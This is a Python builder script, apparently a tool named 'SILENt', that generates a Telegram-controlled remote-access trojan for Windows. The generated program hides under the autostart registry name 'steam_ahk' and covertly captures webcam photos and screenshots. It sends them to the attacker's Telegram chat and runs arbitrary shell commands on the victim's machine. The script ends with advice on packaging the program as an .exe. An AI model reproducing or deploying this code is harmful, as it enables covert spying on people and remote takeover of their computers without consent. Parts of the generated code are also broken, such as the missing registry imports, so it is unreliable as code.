# -*- coding: utf-8 -*- 
import random


banners = [
"""\033[33m
                         __   _____  __    __    __ _   
                        / _\  \_   \/ /   /__\/\ \ \ |_ 
                        \ \    / /\/ /   /_\ /  \/ / __|
                        _\ \/\/ /_/ /___//__/ /\  /| |_ 
                        \__/\____/\____/\__/\_\ \/  \__|
                                                        
                                by kotik06                           \033[39m""",
"""
\033[31m
                   SSSSS  IIIII LL      EEEEEEE NN   NN tt    
                  SS       III  LL      EE      NNN  NN tt    
                   SSSSS   III  LL      EEEEE   NN N NN tttt  
                       SS  III  LL      EE      NN  NNN tt    
                   SSSSS  IIIII LLLLLLL EEEEEEE NN   NN  tttt 
                                                              
                                by kotik06                              \033[39m""",



r"""
     < SILENt >     
 -------------------
  \
   \
   |\_._/|
   |-o.o-|
   (  T  )
  .^`-^-'^.
  `.  ;  .'
  | | | | |
 ((_((|))_))
  ___________
 |           |
 |  kotik06  |
 |___________|


"""

]


def main():
	
	print(random.choice(banners))
	tk=str(input("Telegram bot api token: "))
	proc=str(input("Process name (no file extension): "))
	admin=int(input("Telegram user id:"))
	auto=str(input("Path to autoload (C:\\Program Files\\Oracle\\ ) :"))
    
	if auto == '' or auto == ' ':
		auto=r"C:\\Program Files\\Oracle\\"
	py=proc+'.py'
	exe=proc+'.exe'
	f = open (py,'w')
	f.write("""import os
import time
import cv2# CODE BY SUDOREBOOT
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
import pyautogui as p
ADMIN="""+str(admin)+"""
TOKEN = '"""+str(tk)+"""'
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

def reestr():

	# Путь в реестре
	key_my = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)

	# Установить скрипт в автозагрузку
	SetValueEx(key_my, 'steam_ahk', 0, REG_SZ, r'"""+str(auto)+str(exe)+"""')

	# Закрыть реестр
	CloseKey(key_my)	

def camera():
	
	# Включаем первую камеру
	cap = cv2.VideoCapture(0)
	name='.cam.png'
	# "Прогреваем" камеру, чтобы снимок не был тёмным
	for i in range(30):
		cap.read()
	# Делаем снимок
	ret, frame = cap.read()
	# Записываем в файл
	cv2.imwrite(name, frame)
	# Отключаем камеру
	cap.release()

@dp.message_handler(commands=['start', 'help'])
async def send_welcome(msg: types.Message):
    if msg.from_user["id"] == ADMIN:
        ms=f'''
{msg.from_user["first_name"]}, welcome
Command list:\n/cam - send webcam photo
/screen -  will send you the user\'s screen
/info - get PC info
/term - send terminal command(syntax: /term command1 command2)'''
        
        await msg.answer(ms)
    else:
        await msg.answer("You don't have access")

@dp.message_handler(commands=['screen'])
async def send_photo(msg: types.Message):
    
    im = p.screenshot('.screen.png')
    if msg.from_user["id"] == ADMIN:
        
        #await msg.reply_to_message(msg.text)
        
        #photo = InputFile(".screen.png")
        
        await bot.send_photo(chat_id=ADMIN, photo=open('.screen.png','rb'))
        
        os.remove('.screen.png')
    else:
        await msg.answer("You don't have access")


@dp.message_handler(commands=['cam'])
async def send_photo(msg: types.Message):
    camera()
    
    if msg.from_user["id"] == ADMIN:
    
        # print(msg.from_user)
        #await msg.reply_to_message(msg.text)
        #await msg.answer(f'{msg.from_user["first_name"]}, с возвращением')
        #photo = InputFile(".screen.png")
        
        await bot.send_photo(chat_id=ADMIN, photo=open('.cam.png','rb'))
        os.remove('.cam.png')
    else:
        await msg.answer("You don't have access")
@dp.message_handler(commands=['info'])
async def send_info(msg: types.Message):
    if msg.from_user["id"] == ADMIN:
        info=os.uname()
        #await msg.reply_to_message(msg.text)
      
        await msg.answer(f'''os.name:{info.sysname}
nodename:{info.nodename}
release:{info.release}
machine:{info.machine}
version:{info.version}''')
        
        #await bot.send_photo(chat_id=ADMIN, photo=open('.screen.png','rb'))
        
        #os.remove('.screen.png')
    else:
        await msg.answer("You don't have access")




#@dp.message_handler(content_types=['text'])
@dp.message_handler(commands=['term'])
async def term(msg: types.Message):
    if msg.from_user["id"] == ADMIN:
        
        command = msg['text'].split()
        del(command[0])
        command=' '.join(map(str, command))
        os.system(command)
       # print(command)
        #os.system(f"{msg.text()}")
        await msg.answer("Done")
    else:
        await msg.answer("You don't have access")
if __name__ == '__main__':
    reestr()    
    executor.start_polling(dp)

""")
	f.close()
	print('DONE')
	print("Use pyinstaller for make .exe file ")
	print('bot file is',py)
if __name__ == '__main__':
	main()
